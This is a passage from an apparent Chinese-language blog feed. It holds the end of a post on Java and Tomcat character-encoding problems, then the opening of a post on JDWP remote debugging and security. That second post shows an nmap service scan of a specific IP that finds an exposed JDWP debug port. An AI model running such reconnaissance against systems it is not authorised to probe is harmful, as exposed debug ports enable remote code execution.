&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Error(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看<code>StreamEncoder</code>的<code>forOutputStreamWriter</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Factories for java.io.OutputStreamWriter</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> StreamEncoder <span class="title">forOutputStreamWriter</span><span class="params">(OutputStream out,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      Object lock,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      String charsetName)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> UnsupportedEncodingException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String csn = charsetName;</span><br><span class="line">        <span class="keyword">if</span> (csn == <span class="keyword">null</span>)</span><br><span class="line">            csn = Charset.defaultCharset().name();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (Charset.isSupported(csn))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> StreamEncoder(out, lock, Charset.forName(csn));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalCharsetNameException x) &#123; &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedEncodingException (csn);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到， 如果没有传入编码名称，用的是默认的编码方式，这个<code>Charset.defaultCharset().name()</code>在windows上默认是<code>GBK</code>，这个可以在<code>JDK</code>启动的时候指定参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure><h1 id="Tomcat乱码"><a href="#Tomcat乱码" class="headerlink" title="Tomcat乱码"></a>Tomcat乱码</h1><h2 id="URI编码"><a href="#URI编码" class="headerlink" title="URI编码"></a>URI编码</h2><p>指定为<code>UTF-8</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">maxThreads</span>=<span class="string">"150"</span> <span class="attr">minSpareThreads</span>=<span class="string">"25"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">maxSpareThreads</span>=<span class="string">"75"</span> <span class="attr">enableLookups</span>=<span class="string">"false"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">acceptCount</span>=<span class="string">"100"</span> <span class="attr">debug</span>=<span class="string">"99"</span> <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">disableUploadTimeout</span>=<span class="string">"true"</span> <span class="attr">URIEncoding</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>tomcat 对URI默认的编码是<code>ISO-8859-1</code>，在<code>Connector</code>中配置<strong>URIEncoding=”UTF-8”</strong> 就可以指定编码。</p><p>tomcat中关于编码的代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.connector.CoyoteAdapter#convertURI</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Character conversion of the URI.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">convertURI</span><span class="params">(MessageBytes uri, Request request)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ByteChunk bc = uri.getByteChunk();</span><br><span class="line">        <span class="keyword">int</span> length = bc.getLength();</span><br><span class="line">        CharChunk cc = uri.getCharChunk();</span><br><span class="line">        cc.allocate(length, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        String enc = connector.getURIEncoding();</span><br><span class="line">        <span class="keyword">if</span> (enc != <span class="keyword">null</span>) &#123;</span><br><span class="line">            B2CConverter conv = request.getURIConverter();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (conv == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    conv = <span class="keyword">new</span> B2CConverter(enc, <span class="keyword">true</span>);</span><br><span class="line">                    request.setURIConverter(conv);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    conv.recycle();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                log.error(<span class="string">"Invalid URI encoding; using HTTP default"</span>);</span><br><span class="line">                connector.setURIEncoding(<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (conv != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    conv.convert(bc, cc, <span class="keyword">true</span>);</span><br><span class="line">                    uri.setChars(cc.getBuffer(), cc.getStart(), cc.getLength());</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">                    <span class="comment">// Should never happen as B2CConverter should replace</span></span><br><span class="line">                    <span class="comment">// problematic characters</span></span><br><span class="line">                    request.getResponse().sendError(</span><br><span class="line">                            HttpServletResponse.SC_BAD_REQUEST);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Default encoding: fast conversion for ISO-8859-1</span></span><br><span class="line">        <span class="keyword">byte</span>[] bbuf = bc.getBuffer();</span><br><span class="line">        <span class="keyword">char</span>[] cbuf = cc.getBuffer();</span><br><span class="line">        <span class="keyword">int</span> start = bc.getStart();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            cbuf[i] = (<span class="keyword">char</span>) (bbuf[i + start] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        uri.setChars(cbuf, <span class="number">0</span>, length);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Request的编码"><a href="#Request的编码" class="headerlink" title="Request的编码"></a>Request的编码</h2><p>设置了上述编码后，获取request的参数还是有可能乱码， 此时需要指定对应的filter。</p><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>tomcat中也实现了一个编码的filter：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.filters.SetCharacterEncodingFilter</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Select and set (if specified) the character encoding to be used to</span></span><br><span class="line"><span class="comment">     * interpret request parameters for this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request The servlet request we are processing</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response The servlet response we are creating</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chain The filter chain we are processing</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> IOException if an input/output error occurs</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> ServletException if a servlet error occurs</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">                         FilterChain chain)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Conditionally select and set the character encoding to be used</span></span><br><span class="line">        <span class="keyword">if</span> (ignore || (request.getCharacterEncoding() == <span class="keyword">null</span>)) &#123;</span><br><span class="line">            String characterEncoding = selectEncoding(request);</span><br><span class="line">            <span class="keyword">if</span> (characterEncoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">                request.setCharacterEncoding(characterEncoding);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass control on to the next filter</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在<code>web.xml</code>中的配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filters.SetCharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>GBK<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><p>在spring mvc中可以做如下的配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一定要配置成<strong>第一个</strong><code>filter</code>，否则还是不会生效。</p><p>它的实现也很简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.web.filter.CharacterEncodingFilter#doFilterInternal</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doFilterInternal</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String encoding = getEncoding();</span><br><span class="line">        <span class="keyword">if</span> (encoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isForceRequestEncoding() || request.getCharacterEncoding() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                request.setCharacterEncoding(encoding);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (isForceResponseEncoding()) &#123;</span><br><span class="line">                response.setCharacterEncoding(encoding);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>setCharacterEncoding</code>是Servlet规范中定义的方法， 看下<code>tomcat</code>的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.ApplicationHttpRequest#mergeParameters</span></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Merge the parameters from the saved query parameter string (if any), and</span></span><br><span class="line"><span class="comment">     * the parameters already present on this request (if any), such that the</span></span><br><span class="line"><span class="comment">     * parameter values from the query string show up first if there are</span></span><br><span class="line"><span class="comment">     * duplicate parameter names.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">mergeParameters</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((queryParamString == <span class="keyword">null</span>) || (queryParamString.length() &lt; <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, String[]&gt; queryParameters = <span class="keyword">new</span> HashMap&lt;String, String[]&gt;();</span><br><span class="line">        String encoding = getCharacterEncoding();</span><br><span class="line">        <span class="keyword">if</span> (encoding == <span class="keyword">null</span>)</span><br><span class="line">            encoding = <span class="string">"ISO-8859-1"</span>;</span><br><span class="line">        RequestUtil.parseParameters(queryParameters, queryParamString,</span><br><span class="line">                encoding);</span><br><span class="line">        Iterator&lt;String&gt; keys = parameters.keySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (keys.hasNext()) &#123;</span><br><span class="line">            String key = keys.next();</span><br><span class="line">            Object value = queryParameters.get(key);</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                queryParameters.put(key, parameters.get(key));</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            queryParameters.put</span><br><span class="line">                (key, mergeValues(value, parameters.get(key)));</span><br><span class="line">        &#125;</span><br><span class="line">        parameters = queryParameters;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到默认的编码是<code>&quot;ISO-8859-1&quot;</code>, 为什么要设置成第一个filter呢，找到调用的地方看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.ApplicationHttpRequest#parseParameters</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Parses the parameters of this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If parameters are present in both the query string and the request</span></span><br><span class="line"><span class="comment">     * content, they are merged.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">parseParameters</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parsedParams) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameters = <span class="keyword">new</span> HashMap&lt;String, String[]&gt;();</span><br><span class="line">        parameters = copyMap(getRequest().getParameterMap());</span><br><span class="line">        mergeParameters();</span><br><span class="line">        parsedParams = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，<code>parseParameters</code>只会调用一次，如果在前面的<code>filter</code>中尝试获取<code>Parameters</code>中的参数，这个tomcat就会用默认的编码去解析传入的参数了。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://blog.csdn.net/u010001043/article/details/53203576" rel="external nofollow noopener noreferrer" target="_blank">UrlConnection post请求中文参数乱码问题 - CSDN博客</a></li><li><a href="https://blog.csdn.net/huangshaotian/article/details/7472662" rel="external nofollow noopener noreferrer" target="_blank">设置Java JDK的默认编码为UTF-8 - CSDN博客</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;URLConnection-乱码&quot;&gt;&lt;a href=&quot;#URLConnection-乱码&quot; class=&quot;headerlink&quot; title=&quot;URLConnection 乱码&quot;&gt;&lt;/a&gt;URLConnection 乱码&lt;/h1&gt;&lt;figure class=&quot;hi
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="encoding" scheme="http://qsli.github.io/tags/encoding/"/>
    
  </entry>
  
  <entry>
    <title>jdwp远程调试与安全</title>
    <link href="http://qsli.github.io/2018/08/12/jdwp/"/>
    <id>http://qsli.github.io/2018/08/12/jdwp/</id>
    <published>2018-08-11T22:12:16.000Z</published>
    <updated>2018-08-11T22:12:16.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是JDWP？"><a href="#什么是JDWP？" class="headerlink" title="什么是JDWP？"></a>什么是JDWP？</h1><blockquote><p>JDWP（Java Debug Wire Protocol）是一个为 Java 调试而设计的一个通讯交互协议，它定义了调试器和被调试程序之间<strong>传递的信息的格式</strong>。在 JPDA 体系中，作为前端（front-end）的调试者（debugger）进程和后端（back-end）的被调试程序（debuggee）进程之间的交互数据的格式就是由 JDWP 来描述的，它详细完整地定义了请求命令、回应数据和错误代码，保证了前端和后端的 JVMTI 和 JDI 的通信通畅。比如在 Sun 公司提供的实现中，它提供了一个名为 jdwp.dll（jdwp.so）的动态链接库文件，这个动态库文件实现了一个 Agent，它会负责解析前端发出的请求或者命令，并将其转化为 JVMTI 调用，然后将 JVMTI 函数的返回值封装成 JDWP 数据发还给后端。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Components                          Debugger Interfaces</span><br><span class="line"></span><br><span class="line">                /    |--------------|</span><br><span class="line">               /     |     VM       |</span><br><span class="line"> debuggee ----(      |--------------|  &lt;------- JVM TI - Java VM Tool Interface</span><br><span class="line">               \     |   back-end   |</span><br><span class="line">                \    |--------------|</span><br><span class="line">                /           |</span><br><span class="line"> comm channel -(            |  &lt;--------------- JDWP - Java Debug Wire Protocol</span><br><span class="line">                \           |</span><br><span class="line">                     |--------------|</span><br><span class="line">                     | front-end    |</span><br><span class="line">                     |--------------|  &lt;------- JDI - Java Debug Interface</span><br><span class="line">                     |      UI      |</span><br><span class="line">                     |--------------|</span><br></pre></td></tr></table></figure><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jvmti" rel="external nofollow noopener noreferrer" target="_blank">JVM TI</a> -<strong>Java VM Tool Interface</strong></p><p>Defines the debugging services a VM provides.</p><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdwp" rel="external nofollow noopener noreferrer" target="_blank">JDWP</a> - <strong>Java Debug Wire Protocol</strong></p><p>Defines the communication between <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#debuggee" rel="external nofollow noopener noreferrer" target="_blank">debuggee</a> and debugger processes.</p><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdi" rel="external nofollow noopener noreferrer" target="_blank">JDI</a> - <strong>Java Debug Interface</strong></p><p>Defines a high-level Java language interface which tool developers can easily use to write remote debugger applications.</p><h1 id="发现开启了JDWP的端口"><a href="#发现开启了JDWP的端口" class="headerlink" title="发现开启了JDWP的端口"></a>发现开启了JDWP的端口</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><code>nmap</code>是端口扫描的利器，支持批量扫描网段内端口打开的情况。通过<code>nmap</code>的扫描可以找到端口和对应的协议，这样就可以扫描到打开了远程debug的端口的机器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo nmap -sV 221.221.221.221</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:12 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 972 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.42 seconds</span><br></pre></td></tr></table></figure><p>从扫描的结果中可以看到<code>10010</code>端口开启了远程调试。</p><h3 id="端口明明开了，却没有扫描到？"><a href="#端口明明开了，却没有扫描到？" class="headerlink" 